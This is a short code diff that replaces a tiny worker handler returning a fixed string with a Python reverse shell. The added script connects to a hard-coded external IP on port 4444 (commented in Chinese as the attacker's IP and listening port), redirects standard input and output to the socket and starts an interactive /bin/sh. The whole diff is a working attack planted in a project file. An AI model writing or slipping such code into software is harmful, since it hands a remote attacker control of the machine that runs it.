@@ -1,4 +1,18 @@
-from workers import Response
+import socket
+import subprocess
+import os
 
-async def on_fetch(request, env):
-    return Response("11121")
+# 配置外网主机IP和端口
+REMOTE_HOST = "172.237.65.250"   # 攻击者IP，需替换
+REMOTE_PORT = 4444        # 攻击者监听端口，需替换
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((REMOTE_HOST, REMOTE_PORT))
+    os.dup2(s.fileno(), 0)  # stdin
+    os.dup2(s.fileno(), 1)  # stdout
+    os.dup2(s.fileno(), 2)  # stderr
+    subprocess.call(["/bin/sh", "-i"])
+
+if __name__ == "__main__":
+    main()
